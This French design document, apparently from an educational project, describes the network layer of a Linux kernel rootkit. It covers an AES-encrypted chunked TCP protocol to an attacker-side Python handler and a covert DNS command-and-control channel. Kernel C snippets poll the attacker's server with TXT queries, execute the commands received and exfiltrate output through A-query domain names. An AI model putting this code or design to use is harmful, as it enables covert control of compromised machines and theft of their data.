\page network Réseau
\tableofcontents

## 1. 🌐 Introduction

## 2. 🤝 TCP

### 2.1 🧠 Introduction

Dans l’objectif de sécuriser nos communications réseau, nous avons fait le choix d'utiliser le chiffrement AES-128 pour toutes les données échangées entre le client et le serveur. Cependant, le défaut de cet algorithme est qu'il ne permet pas de transmettre des données de taille arbitraire. En effet, le chiffrement AES-128 produit un bloc de 16 octets, ce qui signifie que les données doivent être découpées en blocs de cette taille avant d'être chiffrées.

Or, lors de la transmission de données via un socket, il est courant que les données soient de taille variable, ce qui pose un problème pour le chiffrement. Il en est bien sûr de même pour les données reçues, qui peuvent être de taille variable et ne pas correspondre à un multiple de 16 octets.

Pour résoudre ce problème, nous avons mis en place un protocole personnalisé de transmission chunkée. Ce protocole permet de découper les données en chunks de taille fixe, chacun étant enrichi d'un en-tête (non chiffré) pour l'identification, la reconstruction et la détection des erreurs. Ainsi, même si les données sont de taille variable, elles peuvent être découpées en chunks de taille fixe, ce qui permet de les chiffrer et de les transmettre de manière fiable.

### 2.2 📦 Protocole

#### Constantes importantes

<div class="full_width_table">
| Constante         | Valeur par défaut  | Description                                |
|------------------|------------------|--------------------------------------------|
| `STD_BUFFER_SIZE`| 1024             | Taille fixe des buffers utilisés           |
| `CHUNK_OVERHEAD` | 11               | 10 (header) + 1 (EOT_CODE)                 |
| `EOT_CODE`       | `0x04`           | Code ASCII pour "End of Transmission"      |
</div>

#### Objectif

Ce protocole personnalisé permet de transmettre de manière fiable des données de taille arbitraire (texte ou fichiers) entre un client et un serveur via un socket noyau. Les données sont **chiffrées** puis **découpées en chunks fixes**, chacun enrichi d’un en-tête pour l’identification, la reconstruction et la détection des erreurs.

#### Structure générale

Chaque chunk est un buffer de taille constante `STD_BUFFER_SIZE` octets structuré comme suit :

```
+-------------------+-------------------+-------------------+-------------------------------+------------+
| total_chunks (4B) | chunk_index (4B)  | data_len (2B)     | payload (≤ BODY_SIZE, var.)   | EOT (1B)   |
+-------------------+-------------------+-------------------+-------------------------------+------------+
```

#### Champs
<div class="full_width_table">
| Champ         | Taille     | Description                                                                 |
|---------------|------------|-----------------------------------------------------------------------------|
| `total_chunks`| 4 octets   | Nombre total de chunks (big-endian)                                        |
| `chunk_index` | 4 octets   | Index de ce chunk dans la séquence (big-endian)                            |
| `data_len`    | 2 octets   | Longueur réelle des données dans le chunk (big-endian)                     |
| `payload`     | variable   | Données chiffrées                                                          |
| `EOT_CODE`    | 1 octet    | Code de fin de transmission pour le chunk (valide si positionné)           |
| `padding`     | variable   | Remplissage pour atteindre `STD_BUFFER_SIZE`, ignoré à la réception        |
</div>
> 🔒 **Toutes les données envoyées dans le payload sont chiffrées avant le découpage en chunks.**

#### Envoi

1. **Chiffrement :** La donnée brute est chiffrée avec AES-128 via `encrypt_buffer`.
2. **Découpage :** Le buffer chiffré est segmenté en chunks de `BODY_SIZE` (= `STD_BUFFER_SIZE - 11 (HEADER_SIZE + FOOTER_SIZE)`).
3. **Encapsulation :** Chaque chunk est préfixé par un en-tête structuré contenant :
  - Le nombre total de chunks
  - L’index du chunk
  - La longueur des données utiles
  - Le marqueur `EOT_CODE` à la fin des données
4. **Envoi :** Chaque chunk est envoyé via `kernel_sendmsg`.

#### Réception

1. **Lecture progressive :**
  - Lecture de l'en-tête (10 octets).
  - Lecture du `payload` + `EOT` (données utiles).
  - Lecture des éventuels octets de padding.
2. **Validation :**
  - Vérifie les tailles.
  - Vérifie la présence correcte du `EOT_CODE`.
  - Assure la cohérence de `total_chunks` et `chunk_index`.
3. **Assemblage :**
  - Alloue un tampon de réception si c’est le premier chunk.
  - Marque chaque chunk reçu comme `vu`.
  - Recopie les données à la bonne position.
  - Attend la réception de tous les chunks.
4. **Déchiffrement :** Une fois tous les chunks reçus, assemble et déchiffre les données avec l'algorithme AES-128.
5. **Traitement du message reçu :**
  - Si la donnée commence par `exec`, la traite comme commande texte.
  - Si un transfert de fichier est en cours, les données reçues sont gérées par la partie de transfert de fichiers.
  - Sinon, elle est copiée vers le tampon utilisateur.

#### Points forts

- **Fiabilité :** Chaque chunk contient des méta-informations pour la vérification de cohérence.
- **Idempotence :** Les chunks sont gérés de sorte à ce que les doublons ne posent pas de souci (copie directe des données dans un tableau en utilisant l'index de chunk).
- **Taille arbitraire :** Le protocole supporte l'envoi de messages faisant jusqu'à 4 To.
- **Sécurité :** Tous les transferts sont chiffrés.
- **Flexibilité :** Gère à la fois les transferts de texte brut et de fichiers binaires.

#### Limitations

- Le protocole ne gère pas les retransmissions : il suppose que les sockets sont fiables ou que les erreurs de transmission sont gérées par le protocole TCP sous-jacent.
- Aucun checksum n’est intégré pour vérifier l'intégrité après chiffrement.
- Le temps d’attente pour recevoir tous les chunks n’est pas limité (peut bloquer indéfiniment).

### 2.3 🛠️ Implémentation
Le protocole personnalisé de transmission chunkée est implémenté dans les fichiers `network.c` (pour le rootkit) et le fichier `AESNetworkHandler.py` (pour l'attaquant). Voici un aperçu des principales fonctions :
Les fonctions principales du protocole chunké sont :

- `send_to_server_raw(const char *data, size_t len)` :
  Cette fonction chiffre les données à envoyer, les découpe en chunks de taille fixe, ajoute un en-tête à chaque chunk (nombre total de chunks, index, taille utile, marqueur de fin), puis les envoie un à un via le socket noyau.  
  Exemple simplifié :

  ```c
  // Encrypt the data before sending
  if (encrypt_buffer(data, len, &encrypted_msg, &encrypted_len) < 0)
        return -EIO;

  // [... Calculate number of chunks and max chunk body size...]

  // Send each chunk separately
  for (i = 0; i < nb_chunks; ++i) {
      // Construction of the header 
      // total_chunks in big-endian 32 bits
      uint32_t tc = (uint32_t)nb_chunks;
      chunk[0] = (uint8_t)((tc >> 24) & 0xFF);
      chunk[1] = (uint8_t)((tc >> 16) & 0xFF);
      chunk[2] = (uint8_t)((tc >> 8) & 0xFF);
      chunk[3] = (uint8_t)((tc >> 0) & 0xFF);

      // chunk_index in big-endian 32 bits
      uint32_t ci = (uint32_t)i;
      chunk[4] = (uint8_t)((ci >> 24) & 0xFF);
      chunk[5] = (uint8_t)((ci >> 16) & 0xFF);
      chunk[6] = (uint8_t)((ci >> 8) & 0xFF);
      chunk[7] = (uint8_t)((ci >> 0) & 0xFF);

      // chunk_len in big-endian 16 bits
      uint16_t cl = (uint16_t)chunk_len;
      chunk[8] = (uint8_t)((cl >> 8) & 0xFF);
      chunk[9] = (uint8_t)((cl >> 0) & 0xFF);

      // Copy the encrypted message into the chunk
      memcpy(chunk + 10, encrypted_msg + i * max_chunk_body, chunk_len);

      // Add the EOT_CODE at the end
      chunk[10 + chunk_len] = EOT_CODE;
      
      // [... Send the chunk via kernel_sendmsg ...]
  }
  ```

- `receive_from_server(char *buffer, size_t max_len)` :  
  Cette fonction lit les données reçues depuis le socket noyau, lit chaque chunk, vérifie son en-tête, assemble les données dans un tampon de réception, et déchiffre le message complet une fois tous les chunks reçus. Ce ne sont finalement que les opérations inverses de `send_to_server_raw`.
  Voici l'exemple de l'implémentation analogue en python (présente dans `AESNetworkHandler.py`) :
  ```python
  def receive(self, sock: socket.socket) -> str | bool:
        # buffer containing the full received message
        buffer = bytearray()
        # List to track received chunks (initialized with first received chunk)
        received_chunks = None
        # Total number of chunks to expect (initialized with first received chunk)
        total_chunks = None

        while True:
            head = # [... Read the header (10 bytes) from the socket ...]

            total_chunks_read = (
                (head[0] << 24) |
                (head[1] << 16) |
                (head[2] << 8)  |
                (head[3] << 0)
            )
            chunk_index = (
                (head[4] << 24) |
                (head[5] << 16) |
                (head[6] << 8)  |
                (head[7] << 0)
            )
            chunk_len = (head[8] << 8) | head[9]

            needed = self._header_size + chunk_len + 1
            if needed > self._buffer_size:
                print(f"[RECEIVE ERROR] chunk_len {chunk_len} inconsistent (need {needed} > {self._buffer_size})")
                return False

            # Read payload plus EOT
            payload_plus_eot = self._recv_exact(sock, chunk_len + 1)
            
            # [... Check payload and EOT code validity ...]

            # Initialize tracking on the first chunk
            if total_chunks is None:
                received_chunks = [False] * total_chunks_read

            # [... Check chunk_index validity (prevent out of bounds) ...]

            # [... Construct the full ciphered message ...]

            # Mark this chunk as received
            received_chunks[chunk_index] = True

            # If all chunks are received, break
            if all(received_chunks):
                break

        return # [...decrypted full message...]
  ```

## 3. 🧭 DNS

Dans le cadre de ce projet, la communication principale utilisée pour l’échange de paquets entre les deux machines virtuelles repose naturellement sur le protocole TCP. Cependant, nous avons choisi de mettre en œuvre une méthode de communication alternative afin d’introduire un aspect furtif aux échanges. L’objectif est de démontrer comment envoyer des commandes à une machine cible via des requêtes DNS de type **TXT**, puis d’exfiltrer les résultats de ces commandes en les encapsulant dans des requêtes DNS de type **A**.

### 3.1 🧠 Principes

Nous supposons ici un scénario réel, où il n’est pas possible de mettre en place un serveur DNS côté victime, notamment en raison de restrictions réseau ou d’un éventuel blocage par un pare-feu. Par conséquent, la solution adoptée consiste à mettre en place un serveur DNS côté attaquant. Depuis l’espace noyau, la machine victime enverra des requêtes DNS de type **TXT** vers un domaine du type *command.dns.google.com*, afin de demander des informations textuelles. C’est dans la réponse à cette requête que l’attaquant peut insérer une commande, si une est disponible. Sinon, la réponse sera vide.

Pour permettre à la victime d’envoyer des résultats d’exécution ou d’autres informations en retour, celle-ci enverra des requêtes DNS de type **A**, où le nom de domaine contient les données chiffrées. Comme la taille maximale d’un nom de domaine est limitée, et que le domaine complet inclut un suffixe du type *.dns.google.com* ainsi que des identifiants de chunk comme *xx/xx-*, les données doivent être fragmentées en plusieurs morceaux. Par défaut :
- Le polling DNS de la victime s’effectue toutes les 5000 ms pour diminuer l’activité réseau (une piste d’amélioration serait d’introduire une part d’aléatoire dans le mécanisme de polling).
- Le nombre de chunks est limité à 128 (config.h), afin d’éviter des délais excessifs côté attaquant, tout en maintenant un niveau de furtivité raisonnable.

Une fois les données reçues, le serveur DNS (côté attaquant) peut simplement répondre avec une adresse IP arbitraire, par exemple **127.0.0.1**, puisque l’adresse **IP** n’a aucune importance dans ce contexte. Si je ne me suis pas trompé dans les calculs (ce qui a de grandes chances d’arriver), on peut envoyer depuis la victime vers l’attaquant 57 octets de données utiles par requête **A**, ce qui restreint évidemment le volume à transférer et augmente le nombre de chunks (en plus avec le chiffrement...). Pour l’envoi de commandes depuis l’attaquant, la limite est beaucoup plus élevée, soit environ 459 octets (dans le champ **RDATA** d’un enregistrement **TXT**).

<img 
  src="dns_technique.svg" 
  style="
    display: block;
    margin: 20px auto;
    overflow: hidden;
  "
/>

### 3.2 📨 Requête

#### 3.2.1 Header

Dans le fichier dns.c, on trouve la définition (packing byte-à-byte) d’un header DNS. En byte order réseau (big-endian), on utilise la fonction `htons()` pour chaque champ 16 bits avant de le copier en mémoire. Le `#pragma pack(push, 1)` s’assure que la structure n’a pas d’alignement automatique, afin que le remplissage en octets soit exactement linéaire (12 octets).

<img 
  src="dns_header.svg" 
  style="
    display: block;
    margin: 20px auto;
    overflow: hidden;
  "
/>

```c
#pragma pack(push, 1)
struct dns_header_t {
    __be16 id;          // Identification (16 bits)
    __be16 flags;       // Flags + codes de réponse (16 bits)
    __be16 qdcount;     // Nombre de questions (16 bits)
    __be16 ancount;     // Nombre d’answers (réponses) (16 bits)
    __be16 nscount;     // Nombre d’autorités (authority RRs) (16 bits)
    __be16 arcount;     // Nombre de RRs additionnels (RRs) (16 bits)
};
#pragma pack(pop)
```

Par ailleurs, la fonction `dns_send_query` est l’élément central qui, dans dns.c, construit à la main un paquet DNS (en UDP) et l’envoie au résolveur. Son prototype est `dns_send_query()`. Après avoir alloué dynamiquement le buffer qui contiendra la requête dans son intégralité, on construit progressivement l’en-tête.
```c
struct dns_header_t *hdr = (void *) packet_buffer;
get_random_bytes(&hdr->id, sizeof(hdr->id));
hdr->flags = htons(0x0100);
hdr->qdcount = htons(1);
hdr->ancount = htons(0);
hdr->nscount = htons(0);
hdr->arcount = htons(0);
offset = DNS_HDR_SIZE;
```

#### 3.2.2 QNAME

Le champ **QNAME** représente le nom de domaine demandé. En DNS, il est encodé en *labels*. On parcourt donc après la construction du *header* la chaîne `query_name`. L'encodage est un peu particulier, car il faut précéder chaque partie entre les points par sa longueur en hexadécimal. Imaginons `query_name = 01/04-abcdef.command.com`, on aura :
```c
[0D] 30 31 2F 30 34 2D 61 62 63 64 65 66    // "01/04-abcdef" (13 chars)
[07] 63 6F 6D 6D 61 6E 64                   // "command" (7 chars)
[03] 63 6F 6D                               // "com" (3 chars)
[00]                                        // Terminaison du QNAME
```

Concernant le **QTYPE**, deux possibilités existent selon l’appel de la fonction qui construit le paquet : soit 1 pour une requête de type **A** (adresse IPv4), soit 16 pour une requête de type **TXT** (texte). À ce stade, la section *Question* du paquet est complète : *header* (12 octets) + **QNAME** (labels + 0x00) + **QTYPE** (2 octets) + **QCLASS** (2 octets). **QCLASS** est le type de réseau ou de protocole pour lequel la requête DNS est faite (1 pour internet ici). On a donc bien finalement la requête DNS brute à envoyer.

#### 3.2.3 Socket
```c
// Create a UDP socket in kernel (need to hide it ?)
result = sock_create_kern(&init_net, AF_INET, SOCK_DGRAM, IPPROTO_UDP, &sock);
if (result < 0) {
  kfree(packet_buffer);
  return result;
}
  
// Prepare the destination address
memset(&dest_addr, 0, sizeof(dest_addr));
dest_addr.sin_family = AF_INET;
dest_addr.sin_port = htons(DNS_PORT);
in4_pton(ip, -1, (u8 *)&dest_addr.sin_addr.s_addr, -1, NULL);

// Tell kernel_sendmsg where to send
msg.msg_name = &dest_addr;
msg.msg_namelen = sizeof(dest_addr);

// Send the DNS query
iov.iov_base = packet_buffer;
iov.iov_len = offset;
result = kernel_sendmsg(sock, &msg, &iov, 1, offset);
if (result < 0) {
  sock_release(sock);
  kfree(packet_buffer);
  return result;
}
```

La création de la socket et l'envoi du message sont ensuite assez classiques :
- `sock_create_kern` crée une socket UDP depuis l’espace noyau.
- `dest_addr.sin_port = htons(DNS_PORT)` configure le port 53 (voir config.h).
- `in4_pton(ip, ...)` convertit l’adresse IP du serveur DNS en `sin_addr.s_addr`
- `kernel_sendmsg` envoie la requête DNS en une seule opération. *Bam !*

#### 3.2.4 Réponse

Toujours dans la même fonction de dns.c, on reçoit une réponse de manière non bloquante, que l’on enregistre dans les buffers pointés par les paramètres de la fonction. L’interprétation de la réponse est effectuée dans une autre fonction que nous verrons par la suite.
```c
iov.iov_base = packet_buffer;
iov.iov_len = DNS_MAX_BUF;
result = kernel_recvmsg(sock, &msg, &iov, 1, DNS_MAX_BUF, MSG_DONTWAIT);
if (result > 0) {
  memcpy(response_buffer, packet_buffer, result);
  *response_length = result;
  result = 0;
}
else if (result == -EAGAIN || result == -EWOULDBLOCK) {
  *response_length = 0;
  result = 0;
}
```

### 3.3 🎯 Commandes

#### 3.3.1 Worker

Par ailleurs, le fichier dns/worker.c contient un thread noyau dédié à la gestion continue des paquets DNS, en particulier à la réception des commandes. Ce thread exécute une boucle principale qui interroge régulièrement le serveur attaquant pour récupérer des instructions. Il est responsable des opérations suivantes :
- Interroger périodiquement l’attaquant via une requête TXT vers `command.DNS_DOMAIN`.
- Si l’attaquant a mis une commande en attente, il la renvoie dans le champ TXT de la réponse.
- Le rootkit sur la victime exécute cette commande.
- Il renvoie ensuite la sortie de la commande (stdout/stderr/status) vers l’attaquant en utilisant `dns_send_data` dans `send_to_server()` dans network.c.

```c
static int dns_worker(void *data) {
  char cmd_buf[RCV_CMD_BUFFER_SIZE / 2];

  while (!kthread_should_stop()) {
    int len = dns_receive_command(cmd_buf, sizeof(cmd_buf));
      if (len > 0) {
  
        // Send the command to the command handler
        rootkit_command(cmd_buf, len + 1, DNS);
      }

      // Sleep for a defined interval to avoid busy-waiting
      msleep(DNS_POLL_INTERVAL_MS);
  }

  return 0;
}
```

#### 3.3.2 Réception

L’interprétation de la commande reçue via une requête **TXT** dans le *worker* est assurée par la fonction `dns_receive_command()`. Comme évoqué précédemment, cette fonction s’appuie sur `dns_send_query`, un *wrapper* générique chargé d’émettre la requête DNS. Une fois la requête envoyée, la victime lit la réponse brute dans le buffer `response_buffer_local`. Elle en extrait ensuite le contenu textuel situé dans la section *Answer TXT* du paquet DNS. La fonction `dns_receive_command` copie cette chaîne dans `cmd_buf` (via le paramètre `out_buffer`) et retourne la longueur du texte extrait.
```c
int dns_receive_command(char *out_buffer, size_t max_length) {
  char *poll_qname;
  u8 *response_buffer_local;
  int response_length_local;
  int result;
  struct dns_header_t *hdr;
  u16 answer_count;
  int offset;

  // Allocate local response buffer
  response_buffer_local = kzalloc(DNS_MAX_BUF, GFP_KERNEL);
  if (!response_buffer_local)
    return -ENOMEM;

  // Build the TXT-poll query name
  poll_qname = kmalloc(128, GFP_KERNEL);
  snprintf(poll_qname, 128, "command.%s", DNS_DOMAIN);

  // Send TXT query and get raw response
  result = dns_send_query(poll_qname, htons(16), response_buffer_local, &response_length_local);
  kfree(poll_qname);
  if (result < 0) {
    kfree(response_buffer_local);
    return -EIO;
  }

  // Parse DNS header and answer count
  hdr = (struct dns_header_t *)response_buffer_local;
  answer_count = ntohs(hdr->ancount);
...
```

### 3.4 🛰️ Exfiltration

Pour transmettre des données, la machine victime utilise la fonction `dns_send_data()`. Cette fonction fragmente un flux de données binaires en *chunks*, les chiffre, les *hexify* (pour s’assurer d’avoir des caractères compatibles avec le protocole DNS), puis les envoie via une série de requêtes DNS. Du côté de l’attaquant, un serveur écoute ces requêtes et recompose les blocs afin de reconstituer l’information initiale. Chaque chunk est encodé dans un nom de domaine respectant les contraintes du protocole DNS. Concrètement, un chunk est transmis sous la forme *&lt;xx&gt;/&lt;xx&gt;-&lt;qname&gt;.dns.google.com*, comme illustré précédemment. Le découpage est effectué au niveau des octets, avec une taille maximale définie par DNS_MAX_CHUNK (28 octets utiles). Cette limite permet de s’assurer que, même après encodage hexadécimal et ajout de préfixes, le QNAME généré reste conforme à la norme : moins de 253 octets au total et moins de 63 caractères entre chaque point ([RFC1035](https://www.ietf.org/rfc/rfc1035.txt))

### 3.5 👾 Attacker



## 4. 🔒 Chiffrement

Pour garantir la confidentialité des échanges entre le client et le serveur, toutes les données sont chiffrées à l’aide de l’algorithme **AES-128** en mode **CBC** (Cipher Block Chaining). Ce choix assure à la fois une simplicité d’implémentation grâce à l'API de chiffrement du noyau Linux, et une sécurité suffisante pour les besoins de ce projet. Le chiffrement est appliqué à tous les messages échangés, qu’il s’agisse de commandes, de réponses ou de simples données.

#### Principes
| Élément         | Détail                                                                                                         |
|-----------------|----------------------------------------------------------------------------------------------------------------|
| **Clé & IV**    | Clé de chiffrement (`key`) et vecteur d’initialisation (`iv`) de **16 octets** (128 bits), conformément à la [spécification AES-128](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard). |
| **Mode CBC**    | Le mode CBC introduit une dépendance entre blocs chiffrés, renforçant la sécurité contre certaines attaques.<br>Choisi pour sa simplicité d’implémentation et sa robustesse lors des tests. |
| **Padding PKCS7** | AES requiert que les données soient un multiple de 16 octets.<br>Le [padding PKCS7](https://en.wikipedia.org/wiki/Padding_%28cryptography%29#PKCS7) complète automatiquement les données et est retiré après déchiffrement. |

#### Implémentation

Voici l'implementation Python du chiffrement AES-128-CBC avec padding PKCS7, présente dans le fichier CryptoHandler.py :

```python

class CryptoHandler:
    def __init__(self, key: bytes, iv: bytes):
        if len(key) != 16 or len(iv) != 16:
            raise ValueError("The key and IV must be exactly 16 bytes.")
        self.key = key
        self.iv = iv

    def encrypt(self, plaintext: str | bytes) -> bytes:
        if isinstance(plaintext, str):
            plaintext = plaintext.encode('utf-8')
        padder = padding.PKCS7(algorithms.AES.block_size).padder()
        padded_data = padder.update(plaintext) + padder.finalize()
        cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=default_backend())
        encryptor = cipher.encryptor()
        return encryptor.update(padded_data) + encryptor.finalize()

    def decrypt(self, ciphertext: bytes) -> str:
        cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=default_backend())
        decryptor = cipher.decryptor()
        padded_data = decryptor.update(ciphertext) + decryptor.finalize()
        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
        data = unpadder.update(padded_data) + unpadder.finalize()
        return data.decode('utf-8', errors='ignore')
```

**Points clés de l’implémentation**

- Chiffrement :  
  1. Conversion éventuelle de la chaîne en bytes.
  2. Application du padding PKCS7.
  3. Création d’un objet Cipher en mode CBC.
  4. Chiffrement des données paddées.

- Déchiffrement :  
  1. Déchiffrement du ciphertext.
  2. Suppression du padding PKCS7.
  3. Décodage en UTF-8.


#### Résumé

- **AES-128-CBC** avec **PKCS7** est utilisé pour tous les échanges.
- La clé et l’IV sont de 16 octets.
- Le padding est appliqué avant chiffrement et retiré après déchiffrement.
- L’implémentation est identique côté Python et C pour garantir l’interopérabilité.

<img 
  src="logo_no_text.png" 
  style="
    display: block;
    margin: 100px auto;
    width: 30%;
    overflow: hidden;
  "
/>